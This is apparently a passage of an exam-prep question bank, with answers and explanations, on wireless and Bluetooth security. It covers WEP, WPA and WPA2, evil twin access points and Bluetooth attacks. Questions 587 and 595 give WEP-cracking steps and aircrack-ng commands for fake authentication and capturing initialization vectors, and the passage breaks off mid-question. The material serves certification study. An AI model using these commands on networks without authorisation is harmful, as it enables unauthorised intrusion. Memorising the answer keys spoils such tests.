> | Encryption | Encryption Algorithm | IV Size | Encryption Key Length | Integrity Check Mechanism |
> |------|-----------|---------|------------|------------------------------|
> | WEP  | RC4       | 24-bits | 40/104-bit | CRC-32                       |
> | WPA  | RC4, TKIP | 48-bit  | 128-bit    | Michael Algorithm and CRC-32 |
> | WPA2 | AES-CCMP  | 48-bit  | 128-bit    | CBC-MAC                      |
> 
> ![](./Images/0577.png)

578. Donald works as a network administrator with ABCSecurity, Inc., a small IT based firm in San Francisco. He was asked to set up a wireless network in the company premises which provides strong encryption to protect the wireless network against attacks. After doing some research, Donald decided to use a wireless security protocol which has the following features:
+ Provides stronger data protection and network access control
+ Uses AES encryption algorithm for strong wireless encryption]
+ Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP)
Which of the following wireless security protocol did Donald decide to use?
+ [ ] WAP
+ [x] WPA2
+ [ ] TKIP
+ [ ] WEP
> **Explanation:**
> + WPA2 (Wi-Fi Protected Access 2) Encryption: WPA2 (Wi-Fi Protected Access 2) is a security protocol used to safeguard the wireless networks and has replaced WPA technology in 2006. It is compatible with the 802.11i standard and supports many security features that WPA does not support. WPA2 introduces the use of the National Institute of Standards and Technology (NIST) FIPS 140-2-compliant AES encryption algorithm, a strong wireless encryption, and Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). It provides stronger data protection and network access control. It gives a high level of security to Wi-Fi connections, so that only authorized users can access it.
> + WPA has better data encryption security than WEP, as messages pass through a Message Integrity Check (MIC) using the Temporal Key Integrity Protocol (TKIP). It uses a Temporal Key Integrity Protocol (TKIP) that utilizes the RC4 stream cipher encryption with 128-bit keys and 64-bit MIC integrity check to provide stronger encryption, and authentication.
> + WEP utilizes an encryption mechanism at the data link layer for minimizing unauthorized access on the WLAN. This is accomplished by encrypting data with the symmetric RC4 encryption algorithm—a cryptographic mechanism used to defend against threats.
> + TKIP: It is a security protocol used in WPA as a replacement for WEP.

579. Which of the following Encryption techniques is used in WEP?
+ [ ] TKIP
+ [ ] AES
+ [x] RC4
+ [ ] DES
> **Explanation:**
> WEP utilizes an encryption mechanism at the data link layer for minimizing unauthorized access on the WLAN. This is accomplished by encrypting data with the symmetric RC4 encryption algorithm—a cryptographic mechanism used to defend against threats.
> 
> TKIP, AES and DES are some of the other types of encryptions.

580. Which of the following Encryption technique is used in WPA?
+ [ ] RSA
+ [ ] AES
+ [ ] DES
+ [x] TKIP
> **Explanation:**
> WPA has better data encryption security than WEP, as messages pass through a Message Integrity Check (MIC) using the Temporal Key Integrity Protocol (TKIP). It uses a Temporal Key Integrity Protocol (TKIP) that utilizes the RC4 stream cipher encryption with 128-bit keys and 64-bit MIC integrity check to provide stronger encryption, and authentication.
> 
> RSA, AES and DES are some of the other types of encryptions.

581. Which of the following does not provide cryptographic integrity protection?
+ [ ] WPA
+ [x] WEP
+ [ ] WPA2
+ [ ] TKIP
> **Explanation:**
> WEP does not provide cryptographic integrity protection. By capturing two packets, an attacker can flip a bit in the encrypted stream and modify the checksum so that the packet is accepted.

582. Which of the following protocol encapsulates the EAP within an encrypted and authenticated Transport Layer Security (TLS) tunnel?
+ [ ] LEAP
+ [ ] RADIUS
+ [ ] CCMP
+ [x] PEAP
> **Explanation:**
> + **RADIUS:** It is a centralized authentication and authorization management system.
> + **PEAP:** It is a protocol that encapsulates the EAP within an encrypted and authenticated Transport Layer Security (TLS) tunnel.
> + **LEAP:** It is a proprietary version of EAP developed by Cisco.
> + **CCMP:** It is an encryption protocol used in WPA2 for stronger encryption and authentication.

583. Which of the following consists of 40/104 bit Encryption Key Length?
+ [x] WEP
+ [ ] WPA2
+ [ ] WPA
+ [ ] RSA
> **Explanation:**
> The length of the WEP and the secret key are:
> + 64-bit WEP uses a 40-bit key
> + 128-bit WEP uses a 104-bit key size
> + 256-bit WEP uses 232-bit key size
> 
> WEP normally uses a 40-bit or 104-bit encryption key, whereas TKIP in WPA uses 128-bit keys for each packet. The message integrity check for WPA avoids the chances of the attacker changing or resending the packets.

584. Which of the following includes mandatory support for Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP)?
+ [ ] WEP
+ [ ] WPA
+ [ ] TKIP
+ [x] WPA2
> **Explanation:**
> WPA2 (Wi-Fi Protected Access 2) Encryption: WPA2 (Wi-Fi Protected Access 2) is a security protocol used to safeguard the wireless networks and has replaced WPA technology in 2006. It is compatible with the 802.11i standard and supports many security features that WPA does not support. WPA2 introduces the use of the National Institute of Standards and Technology (NIST) FIPS 140-2-compliant AES encryption algorithm, a strong wireless encryption, and Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). It provides stronger data protection and network access control. It gives a high level of security to Wi-Fi connections, so that only authorized users can access it.
> 
> WPA has better data encryption security than WEP, as messages pass through a Message Integrity Check (MIC) using the Temporal Key Integrity Protocol (TKIP). It uses a Temporal Key Integrity Protocol (TKIP) that utilizes the RC4 stream cipher encryption with 128-bit keys and 64-bit MIC integrity check to provide stronger encryption, and authentication.
> 
> WEP utilizes an encryption mechanism at the data link layer for minimizing unauthorized access on the WLAN. This is accomplished by encrypting data with the symmetric RC4 encryption algorithm—a cryptographic mechanism used to defend against threats.

585. Which of the following is a standard for Wireless Local Area Networks (WLANs) that provides improved encryption for networks that use 802.11a, 802.11b, and 802.11g standards?
+ [x] 802.11i
+ [ ] 802.11n
+ [ ] 802.11e
+ [ ] 802.11d
> **Explanation:**
> **802.11n:** The IEEE 802.11n is a revision that enhances the earlier 802.11g standards with multiple-input multiple-output (MIMO) antennas. It works in both the 2.4 GHz and 5 GHz bands. This is an IEEE industry standard for Wi-Fi wireless local network transportations. Digital Audio Broadcasting (DAB) and Wireless LAN use OFDM.
> 
> **802.11i:** The IEEE 802.11i standard improves WLAN security by implementing new encryption protocols such as TKIP and AES. It is a standard for wireless local area networks (WLANs) that provides improved encryption for networks that use the popular 802.11a, 802.11b (which includes Wi-Fi) and 802.11g standards.
> 
> **802.11d:** The 802.11d is an enhanced version of 802.11a and 802.11b. The standard supports regulatory domains. The particulars of this standard can be set at the media access control (MAC) layer.
> 
> **802.11e:** It is used for real-time applications such as voice, VoIP, and video. To ensure that these time-sensitive applications have the network resources they need, 802.11e defines mechanisms to ensure Quality of Service (QoS) to Layer 2 of the reference model, the medium-access layer, or MAC.

586. Which of the following cryptographic algorithms is used by CCMP?
+ [ ] DES
+ [x] AES
+ [ ] RC4
+ [ ] TKIP
> **Explanation:**
> CCMP is an encryption protocol used in WPA2 for stronger encryption and authentication. WPA2 is an upgrade to WPA using AES and CCMP for wireless data encryption. WPA2 introduces the use of the National Institute of Standards and Technology (NIST) FIPS 140-2-compliant AES encryption algorithm, a strong wireless encryption, and counter mode cipher block chaining message authentication code protocol (CCMP). It provides stronger data protection and network access control. It gives a high level of security to Wi-Fi connections, so that only authorized users can access it.


## Wireless Hacking Methodology
587. There is a WEP encrypted wireless AP with no clients connected. In order to crack the WEP key, a fake authentication needs to be performed. Which of the following steps need to be performed by the attacker for generating fake authentication?
+ [ ] Use cracking tools
+ [ ] Set the wireless interface to monitor mode
+ [ ] Capture the IVs
+ [x] Ensure association of source MAC address with the AP
> **Explanation:**
> To break WEP encryption the attacker follows these steps:  
> + **Start the wireless interface in monitor mode on the specific AP channel**
> In this step, the attacker sets the wireless interface to monitor mode. The interface can listen to every packet in the air. The attacker can select some packets for injection by listening to every packet available in the air.
> 
> + **Test the injection capability of the wireless device to the AP**
> The attacker tests whether the wireless interface is within the range of the specified AP and whether it is capable of injecting packets to it.
> 
> + **Use a tool such as aireplay-ng to do a fake authentication with the AP**
> The attacker ensures that the source MAC address is already associated, so that the AP accepts the injected packets. The injection will fail due to the lack of association with the AP.
> 
> + **Start the Wi-Fi sniffing tool**
> The attacker captures the IVs generated by using tools such as Cain & Abel and airodump-ng with a BSSID filter to collect unique IVs.
> 
> + **Start a Wi-Fi packet encryption tool such as aireplay-ng in ARP request replay mode to inject packets**
> To gain a large number of IVs in a short period, the attacker turns the aireplay-ng into ARP request replay mode, which listens for ARP requests and then re-injects them back into the network. The AP usually rebroadcasts packets generating a new IV. So in order to gain a large number of IVs, the attacker selects the ARP request mode.
> 
> + **Run a cracking tool such as Cain & Abel or aircrack-ng**
> Using cracking tools such as Cain & Abel or aircrack-ng the attacker can extract WEP encryption keys from the IVs.

588. During a wireless penetration test, a tester detects an AP using the WPA2 encryption. Which of the following attacks should be used to obtain the key?
+ [x] The tester must capture the WPA2 authentication handshake and then crack it.
+ [ ] The tester cannot crack WPA2 because it is in full compliance with the IEEE 802.11i standard.
+ [ ] The tester must change the MAC address of the wireless network card and then use the AirTraf tool to obtain the key.
+ [ ] The tester must use the tool inSSIDer to crack it using the ESSID of the network.
> **Explanation:**
> An attacker may succeed in unauthorized access to the target network by trying various method such as launching various wireless attacks, placing rogue APs, evil twins, etc. The next step for the attacker is to crack the security imposed by the target wireless network. Generally, a Wi-Fi network uses WEP or WPA/WPA2 encryption for securing wireless communication. The attacker now tries to break the security of the target wireless network by cracking these encryptions systems. Let us see how an attacker cracks these encryption systems to breach wireless network security.
> 
> WPA encryption is less exploitable than WEP encryption. However, an attacker can still crack WPA/WPA2 by capturing the right type of packets. The attacker can perform this offline and needs to be near the AP for a few moments in order to capture the WPA/WPA2 authentication handshake.

589. Which of the following availability attacks involve exploiting the CSMA/CA Clear Channel Assessment (CCA) mechanism to make a channel appear busy?
+ [x] Denial-of-Service
+ [ ] Routing Attack
+ [ ] Authenticate Flood
+ [ ] Beacon Flood
> **Explanation:**
> Some of the availability attacks include:
>  | Type of Attack     | Description | Method and Tools |
> |--------------------|-------------|------------------|
> | Beacon Flood       | Generating thousands of counterfeit 802.11 beacons to make it hard for clients to find a legitimate AP. | FakeAP |
> | Denial-of-Service  | Exploiting the CSMA/CA Clear Channel Assessment (CCA) mechanism to make a channel appear busy. | An adapter that supports CW Tx mode, with a low-level utility to invoke continuous transmissions |
> | Routing Attacks    | Distributing routing information within the network. | RIP protocol |
> | Authenticate Flood | Sending forged authenticates or associates from random MACs to fill a target AP's association table. | AirJack, File2air, Macfld, void11 |
> 
> (OR)
> 
> ```
> | Type of Attack     | Description                                                                                             | Method and Tools                                                                                 |
> |--------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
> | Beacon Flood       | Generating thousands of counterfeit 802.11 beacons to make it hard for clients to find a legitimate AP. | FakeAP                                                                                           |
> | Denial-of-Service  | Exploiting the CSMA/CA Clear Channel Assessment (CCA) mechanism to make a channel appear busy.          | An adapter that supports CW Tx mode, with a low-level utility to invoke continuous transmissions |
> | Routing Attacks    | Distributing routing information within the network.                                                    | RIP protocol                                                                                     |
> | Authenticate Flood | Sending forged authenticates or associates from random MACs to fill a target AP's association table.    | AirJack, File2air, Macfld, void11                                                                |
> ```


590. John is a pen tester working with an information security consultant based in Paris. As part of a penetration testing assignment, he was asked to perform wireless penetration testing for a large MNC. John knows that the company provides free Wi-Fi access to its employees on the company premises. He sets up a rogue wireless access point with the same SSID as that of the company’s Wi-Fi network just outside the company premises. He sets up this rogue access point using the tools that he has and hopes that the employees might connect to it. What type of wireless confidentiality attack is John trying to do?
+ [ ] WEP Cracking
+ [ ] War Driving
+ [x] Evil Twin AP
+ [ ] KRACK Attack
> **Explanation:**
> **Evil twin AP:** It is a rough access point masquerading as a genuine Wi-Fi access point. Once a user connects to it, the attacker can intercept confidential information.
> 
> **KRACK attack:** KRACK attack stands for Key Reinstallation Attack. This attack exploits the flaws present in the implementation of a 4-way handshake process in WPA2 authentication protocol that is used to establish a connection between a device and the Access Point (AP).
> 
> **War Driving:** It is an act of searching and exploiting Wi-Fi wireless networks while driving around a city or elsewhere.
> 
> **WEP Cracking:** It is a process of capturing data to recover a WEP key using WEP cracking tools such as Aircrack-ng.

591. Posing as an authorized AP by beaconing the WLAN's SSID to lure users is known as __________.
+ [ ] Masquerading
+ [ ] Honeypot Access Point
+ [ ] Man-in-the-Middle Attack
+ [x] Evil Twin AP
> **Explanation:**
> Correct answer: **Evil Twin AP:** Posing as an authorized AP by beaconing the WLAN's SSID to lure users.  
> 
> **Masquerading:** Pretending to be an authorized user to gain access t o a system.  
> 
> **MITM attack:** Running traditional MITM attack tools on an evil twin AP to intercept TCP sessions or SSL/SSH tunnels.  
> 
> **Honeypot AP:** Setting an AP's SSID to be the same as that of a legitimate AP.

592. In which of the following technique, an attacker draws symbols in public places to advertise open Wi-Fi networks?
+ [ ] WarDriving
+ [ ] WarFlying
+ [ ] WarWalking
+ [x] WarChalking
> **Explanation:**
> **WarWalking**: Attackers walk around with Wi-Fi enabled laptops to detect open wireless networks.
> 
> **WarChalking**: A method used to draw symbols in public places to advertise open Wi-Fi networks.
> 
> **WarFlying**: Attackers use drones to detect open wireless networks.
> 
> **WarDriving**: Attackers drive around with Wi-Fi enabled laptops to detect open wireless networks.

593. This application is a Wi-Fi security tool for mobile devices, It works on both Root and Non-root devices, and it can prevent ARP spoofing attacks such as MITM attacks, which are used by some applications such as WifiKill, dSploit, and sniffers.
+ [ ] Airbase-ng
+ [ ] inSSIDer
+ [ ] Wifi Inspector
+ [x] WiFiGuard
> **Explanation:**
> WiFiGurad can work on both Root and Non-root devices. This application can prevent ARP spoofing attacks such as MITM attacks, which are used by some applications such as WifiKill, dSploit, and sniffers.
> + Non-root features: Gives information about the attack.  
> + Root features: Active mode that restores the ARP table, Passive mode for static ARP table.

594. Steven, a wireless network administrator, has just finished setting up his company’s wireless network. He has enabled various security features such as changing the default SSID and enabling strong encryption on the company’s wireless router. Steven decides to test the wireless network for confidentiality attacks to check whether an attacker can intercept information sent over wireless associations, whether sent in clear text or encrypted by Wi-Fi protocols. As a part of testing, he tries to capture and decode unprotected application traffic to obtain potentially sensitive information using hardware or software tools such as Ettercap, Kismet, Wireshark, etc. What type of wireless confidentiality attack is Steven trying to do?
+ [ ] Evil twin AP
+ [x] Eavesdropping
+ [ ] WEP Key Cracking
+ [ ] Masquerading
> **Explanation:**
> Confidentiality attacks on wireless networks Include:
> | Type of Attack | Description | Method and Tools |
> |--|--|--|
> | Eavesdropping | Capturing and decoding unprotected application traffic to obtain potentially sensitive information. | bsd-airtools, Ethereal, Ettercap, Kismet, commercial analyzers |
> | Cracking WEP Key | Capturing data to recover a WEP key using brute force or Fluhrer-Mantin-Shamir (FMS) cryptanalysis. | Aircrack, AirSnort, chopchop, WepAttack, WepDecrypt |
> | Evil Twin AP | Posing as an authorized AP by beaconing the WLAN's SSID to lure users. | CqureAP, HostAP, OpenAP |
> | Masquerading | Pretending to be an authorized user to gain access to a system. | Stealing login IDs and passwords, bypassing authentication mechanisms |

595. Kenneth, a professional penetration tester, was hired by the XYZ Company to conduct wireless network penetration testing. Kenneth proceeds with the standard steps of wireless penetration testing. He tries to collect lots of initialization vectors (IVs) using the injection method to crack the WEP key. He uses the aircrack-ng tool to capture the IVs from a specific AP. Which of the following aircrack-ng commands will help Kenneth to do this?
+ [ ] `airmon-ng start wifi0 9`
+ [ ] `aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0`
+ [x] `airodump-ng -c 9 -- bssid 00:14:6C:7E:40:80 -w output ath0`
+ [ ] `aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80 ath0`
> **Explanation:**
> Start airodump-ng to capture the IVs: The purpose of this step is to capture the IVs generated. This step starts airodump-ng to capture the IVs from the specific AP. Open another console session to capture the generated IVs. Then enter:
> `airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0`
> Where:
> + -c 9 is the channel for the wireless network
> + --bssid 00:14:6C:7E:40:80 is the AP MAC address. This eliminates extraneous traffic.
> + -w capture is file name prefix for the file which will contain the IVs.
> + ath0 is the interface name.
> 
> Test Wireless Device Packet Injection: The purpose of this step ensures that your card is within distance of your AP and can inject packets to it. Enter:
> `aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80 ath0`
> Where:
> + -9 means injection test
> + -e teddy is the wireless network name
> + -a 00:14:6C:7E:40:80 is the AP MAC address
> + ath0 is the wireless interface name
> 
> Start the wireless card: Enter the following command to start the wireless card on channel 9 in monitor mode:
> `airmon-ng start wifi0 9`
> + Substitute the channel number that your AP runs on for “9” in the command above.
> 
> Use aireplay-ng to do a fake authentication with the AP: In order for an AP to accept a packet, the source MAC address must already be associated. If the source MAC address you are injecting is not associated then the AP ignores the packet and sends out a “DeAuthentication” packet in cleartext. In this state, no new IVs are created because the AP is ignoring all the injected packets.
> To associate with an AP, use fake authentication:
> `aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0`
> Where:
> + -1 means fake authentication
> + 0 reassociation timing in seconds
> + -e teddy is the wireless network name
> + -a 00:14:6C:7E:40:80 is the AP MAC address
> + -h 00:0F:B5:88:AC:82 is our card MAC address
> + ath0 is the wireless interface name

596. Which of the following Wi-Fi discovery tools facilitates detection of Wireless LANs using the 802.11a/b/g WLAN standards and is commonly used for wardriving, verifying network configurations, finding locations with poor coverage and detecting rouge APs?
+ [ ] WeFi
+ [x] NetStumbler
+ [ ] WifiScanner
+ [ ] AirCrack-NG
> **Explanation:**
> NetStumbler (also known as Network Stumbler) is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards.The program is commonly used for:  
> + Wardriving
> + Verifying network configurations
> + Finding locations with poor coverage in a WLAN
> + Detecting causes of wireless interference
> + Detecting unauthorized ("rogue") access points
> + Aiming directional antennas for long-haul WLAN links  
> 
> WeFi is a free Windows utility that helps you connect to open Wi-Fi hotspots. Sifting through the dozens of available hot spots sucks up valuable time that you could be using to work.
> 
> Aircrack- ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security such as, monitoring, packet capture and export of data to text files for further processing by third party tools.


## Bluetooth Hacking Techniques
597. Which of the following Bluetooth attack allows attacker to gain remote access to a target Bluetooth-enabled device without the victim being aware of it?
+ [ ] Bluesmacking
+ [ ] Bluejacking
+ [x] Bluebugging
+ [ ] BluePrinting
> **Explanation:**
> **Bluebugging**: Bluebugging is an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it. In this attack, an attacker sniffs sensitive information and might perform malicious activities such as intercepting phone calls and messages, forwarding calls and text messages, etc.
> 
> **Bluesmacking**: A Bluesmacking attack occurs when an attacker sends an oversized ping packet to a victim's device, causing a buffer overflow. This type of attack is similar to an ICMP ping of death.
> 
> **BluePrinting**: BluePrinting is a footprinting technique performed by an attacker in order to determine the make and model of the target Bluetooth-enabled device. Attackers collect this information to create infographics of the model, manufacturer, etc. and analyze them in an attempt to find out whether the devices are in the range of vulnerability to exploit.
> 
> **Bluejacking**: Bluejacking is the use of Bluetooth to send messages to users without the recipient's consent, similar to email spamming. Prior to any Bluetooth communication, the device initiating connection must provide a name that is displayed on the recipient's screen. As this name is user-defined, it can be set to be an annoying message or advertisement. Strictly speaking, Bluejacking does not cause any damage to the receiving device. However, it may be irritating and disruptive to the victims.

598. Thomas is a cyber thief trying to hack Bluetooth-enabled devices at public places. He decided to hack Bluetooth-enabled devices by using a DoS attack. He started sending an oversized ping packet to a victim’s device, causing a buffer overflow and finally succeeded. What type of Bluetooth device attack is Thomas most likely performing?
+ [ ] Blue Snarfing
+ [ ] Bluebugging
+ [ ] Bluejacking
+ [x] Bluesmacking
> **Explanation:**
> + **Bluesmacking:** A Bluesmacking attack occurs when an attacker sends an oversized ping packet to a victim's device, causing a buffer overflow. This type of attack is similar to an ICMP ping of death.  
> + **Bluejacking:** Bluejacking is the use of Bluetooth to send messages to users without the recipient's consent, similar to email spamming. Prior to any Bluetooth communication, the device initiating connection must provide a name that is displayed on the recipient's screen. As this name is user-defined, it can be set to be an annoying message or advertisement. Strictly speaking, Bluejacking does not cause any damage to the receiving device. However, it may be irritating and disruptive to the victims.  
> + **Blue Snarfing:** Bluesnarfing is a method of gaining access to sensitive data in a Bluetooth-enabled device. An attacker who is within range of a target can use special software to obtain the data stored on the victim's device.  
> + **Bluebugging:** Bluebugging is an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it. In this attack, an attacker sniffs sensitive information and might perform malicious activities such as intercepting phone calls and messages, forwarding calls and text messages, etc.

599. Which of the following bluetooth mode filters out non-matched IACs and reveals itself only to those that matched?
+ [ ] Discoverable
+ [ ] Pairable mode
+ [x] Limited discoverable
+ [ ] Non-discoverable
> **Explanation:**
> **Discoverable:** When Bluetooth devices are in discoverable mode, they are visible to other Bluetooth-enabled devices.  
> 
> **Limited discoverable:** In limited discoverable mode, Bluetooth devices are discoverable only for a limited period, for a specific event, or during temporary conditions. When a device is set to the limited discoverable mode, it filters out non-matched IACs and reveals itself only to those that matched.  
> 
> **Non-discoverable:** Setting the Bluetooth device to non-discoverable mode prevents that device from appearing on the list during a Bluetooth-enabled device search process.  
> 
> **Pairable mode:** In pairable mode, the Bluetooth device accepts the pairing request when asked, and establishes a connection with the pair requesting device.

600. Which of the following terms is used to describe an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it?
+ [ ] Bluesmacking
+ [ ] Bluejacking
+ [ ] Bluesnarfing
+ [x] Bluebugging
> **Explanation:**
> + **Bluesmacking:** A Bluesmacking attack occurs when an attacker sends an oversized ping packet to a victim's device, causing a buffer overflow. This type of attack is similar to an ICMP ping of death.  
> + **Bluejacking:** Bluejacking is the use of Bluetooth to send messages to users without the recipient's consent, similar to email spamming. Prior to any Bluetooth communication, the device initiating connection must provide a name that is displayed on the recipient's screen. As this name is user-defined, it can be set to be an annoying message or advertisement. Strictly speaking, Bluejacking does not cause any damage to the receiving device. However, it may be irritating and disruptive to the victims.  
> + **Blue Snarfing:** Bluesnarfing is a method of gaining access to sensitive data in a Bluetooth-enabled device. An attacker who is within range of a target can use special software to obtain the data stored on the victim's device.  
> + **Bluebugging:** Bluebugging is an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it. In this attack, an attacker sniffs sensitive information and might perform malicious activities such as intercepting phone calls and messages, forwarding calls and text messages, etc.

601. Which of the following protocols is used by BlueJacking to send anonymous messages to other Bluetooth-equipped devices?
+ [x] OBEX
+ [ ] LMB
+ [ ] L2CAP
+ [ ] SDP
> **Explanation:**
> + **Link management protocol (LMP):** Is used for control of the radio link between two devices, handling matters such as link establishment, querying device abilities and power control. It is implemented on the controller.  
> + **OBEX:** Object Exchange protocol is used for communicating binary objects between devices. BlueJacking is sending anonymous messages to other Bluetooth-equipped devices via the OBEX protocol.  
> + **Logical link control and adaptation protocol (L2CAP):** L2CAP passes packets to either the Host Controller Interface (HCI) or on a hostless system, directly to the Link Manager/ACL link.  
> + **Service discovery protocol (SDP):** Is used to allow devices to discover what services each other support, and what parameters to use to connect to them.

602. An attacker collects the make and model of target Bluetooth-enabled devices analyzes them in an attempt to find out whether the devices are in the range of vulnerability to exploit. Identify which type of attack is performed on Bluetooth devices.
+ [x] BluePrinting
+ [ ] MAC Spoofing Attack
+ [ ] BlueSniff
+ [ ] Bluebugging
> **Explanation:**
> + **BlueSniff:** BlueSniff is a proof of concept code for a Bluetooth wardriving utility. It is useful for finding hidden and discoverable Bluetooth devices.  
> + **Bluebugging:** Bluebugging is an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it. In this attack, an attacker sniffs sensitive information and might perform malicious activities such as intercepting phone calls and messages, forwarding calls and text messages, etc.  
> + **BluePrinting:** BluePrinting is a footprinting technique performed by an attacker in order to determine the make and model of the target Bluetooth-enabled device. Attackers collect this information to identify model, manufacturer, etc. and analyze them in an attempt to find out whether the devices are in the range of vulnerability to exploit.  
> + **MAC Spoofing Attack:** MAC Spoofing Attack is a passive attack in which attackers spoof the MAC address of the target Bluetooth-enabled device, in order to intercept or manipulate the data sent towards the target device.

603. In which of the following attacks does the attacker exploit the vulnerability in the Object Exchange (OBEX) protocol that Bluetooth uses to exchange information?
+ [x] Bluesnarfing
+ [ ] Bluebugging
+ [ ] BlueSniff
+ [ ] Bluejacking
> **Explanation:**
> In Bluesnarf, an attacker exploits the vulnerability in the Object Exchange (OBEX) protocol that Bluetooth uses to exchange information. The attacker connects with the target and performs a GET operation for files with correctly guessed or known names, such as /pb.vcf for the device's phonebook or telecom /cal.vcs for the device's calendar file.

604. In which type of bluetooth threat does an attacker trick Bluetooth users to lower security or disable authentication for Bluetooth connections in order to pair with them and steal information?
+ [ ] Malicious Code
+ [ ] Remote Control
+ [ ] Bugging Devices
+ [x] Social Engineering
> **Explanation:**
> **Bugging Devices:** Attackers could instruct the user to make a phone call to other phones without any user interaction. They could even record the user’s conversation.  
> 
> **Remote Control:** Hackers can remotely control a phone to make phone calls or connect to the Internet.  
> 
> **Social Engineering:** Attackers trick Bluetooth users to lower security or disable authentication for Bluetooth connections in order to pair with them and steal information.  
> 
> **Malicious Code:** Mobile phone worms can exploit a Bluetooth connection to replicate and spread themselves.

605. A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the corporate network. What tool should the analyst use to perform a Blackjacking attack?
+ [ ] Blooover
+ [x] BBProxy
+ [ ] BBCrack
+ [ ] Paros Proxy
> **Explanation:**
> **Paros Proxy** is a Java-based web proxy for assessing web application vulnerability. It supports editing/viewing HTTP/HTTPS messages on-the-fly to change items such as cookies and form fields.
> 
> **BBproxy** is a security assessment tool that is written in Java and runs on Blackberry devices. lt allows the device to be used as a proxy between the Internet and an internal network.  
> 
> **bbcrack:** (Balbucrack) is a tool to crack typical malware obfuscation such as XOR, ROL, ADD (and many combinations), by brute forcing all possible keys and checking for specific patterns (IP addresses, domain names, URLs, known file headers and strings, etc) using the balbuzard engine.
> 
> **Blooover** is a J2ME Phone Auditing Tool. Since Adam Laurie's BlueSnarf experiment and the subsequent BlueBug experiment it is proven that some Bluetooth-enabled phones have security issues.

606. Fill in the blank.  
_________ is the art of collecting information about Bluetooth enabled devices such as manufacturer, device model and firmware version.
+ [x] BluePrinting
+ [ ] Bluejacking
+ [ ] Bluebugging
+ [ ] BlueSniff
> **Explanation:**
> + **BluePrinting:** BluePrinting is a footprinting technique performed by an attacker in order to determine the make, device model, firmware version, etc. of the target Bluetooth-enabled device. Attackers collect such information from remote bluetooth devices and analyze them in an attempt to find out whether the devices are in the range of vulnerability to exploit.  
> + **Bluejacking:** Bluejacking is the use of Bluetooth to send messages to users without the recipient's consent, similar to email spamming. Prior to any Bluetooth communication, the device initiating connection must provide a name that is displayed on the recipient's screen. As this name is user-defined, it can be set to be an annoying message or advertisement. Strictly speaking, Bluejacking does not cause any damage to the receiving device. However, it may be irritating and disruptive to the victims.  
> + **Bluebugging:** Bluebugging is an attack in which an attacker gains remote access to a target Bluetooth-enabled device without the victim being aware of it. In this attack, an attacker sniffs sensitive information and might perform malicious activities such as intercepting phone calls and messages, forwarding calls and text messages, etc.  
> + **BlueSniff:** BlueSniff is a proof of concept code for a Bluetooth wardriving utility. It is useful for finding hidden and discoverable Bluetooth devices. It operates on Linux.


## Wireless Hacking Countermeasures
607. Mark is working as a penetration tester in InfoSEC, Inc. One day, he notices that the traffic on the internal wireless router suddenly increases by more than 50%. He knows that the company is using a wireless 802.11 a/b/g/n/ac network. He decided to capture live packets and browse the traffic to investigate the issue to find out the actual cause. Which of the following tools should Mark use to monitor the wireless network?
+ [x] CommView for WiFi
+ [ ] BlueScanner
+ [ ] WiFish Finder
+ [ ] WiFiFoFum
> **Explanation:**
> **CommView for WiFi:** CommView for Wi-Fi is a wireless network monitor and analyzer for 802.11 a/b/g/n networks. It captures packets to display important information such as the list of APs and stations, per-node and per-channel statistics, signal strength, a list of packets and network connections, protocol distribution charts, etc. By providing this information, CommView for Wi-Fi can view and examine packets, pinpoint network problems, and troubleshoot software and hardware.  
> 
> **WiFiFoFum:** WiFiFoFum is a wardriving app to locate, display and map found WiFi networks. WiFiFoFum scans for 802.11 Wi-Fi networks and displays information about each including: SSID, MAC, RSSI, channel, and security. WiFiFoFum also allows you to connect to networks you find and log the location using the GPS. KML logs can be emailed.  
> 
> **BlueScan:** BlueScan is a bash script that implements a scanner to detect Bluetooth devices that are within the range of our system. BlueScan works in a non-intrusive way, that is, without establishing a connection with the devices found and without being detected. Superuser privileges are not necessary to execute it.  
> 
> **WiFish Finder:** WiFish Finder is a tool for assessing whether WiFi devices active in the air are vulnerable to ‘Wi-Fishing’ attacks. Assessment is performed through a combination of passive traffic sniffing and active probing techniques. Most WiFi clients keep a memory of networks (SSIDs) they have connected to in the past. Wi-Fish Finder first builds a list of probed networks and then using a set of clever techniques also determines security setting of each probed network. A client is a fishing target if it is actively seeking to connect to an OPEN or a WEP network.

608. Andrew, a professional penetration tester, was hired by ABC Security, Inc., a small IT-based firm in the United States to conduct a test of the company’s wireless network. During the information-gathering process, Andrew discovers that the company is using the 802.11 g wireless standard. Using the NetSurveyor Wi-Fi network discovery tool, Andrew starts gathering information about wireless APs. After trying several times, he is not able to detect a single AP. What do you think is the reason behind this?
+ [ ] NetSurveyor does not work against 802.11g.
+ [x] SSID broadcast feature must be disabled, so APs cannot be detected.
+ [ ] Andrew must be doing something wrong, as there is no reason for him to not detect access points.
+ [ ] MAC address filtering feature must be disabled on APs or router.
> **Explanation:**
> NetSurveyor is an 802.11 (Wi-Fi) network discovery tool that gathers information about nearby wireless access points in real time and displays it in useful ways. It is a network discovery tool that reports the SSID for each wireless network it detects, along with the channel used by the AP servicing that network. In a secure business environment, this tool is used for detecting the presence of rogue APs. A Wi-Fi network discovery tool will not be able to detect SSID and a wireless network if the SSID broadcast feature is disabled in the AP.

609. Which of the following countermeasure helps in defending against KRACK attack?
+ [ ] Choose Wired Equivalent Privacy (WEP) instead of Wi-Fi Protected Access (WPA)
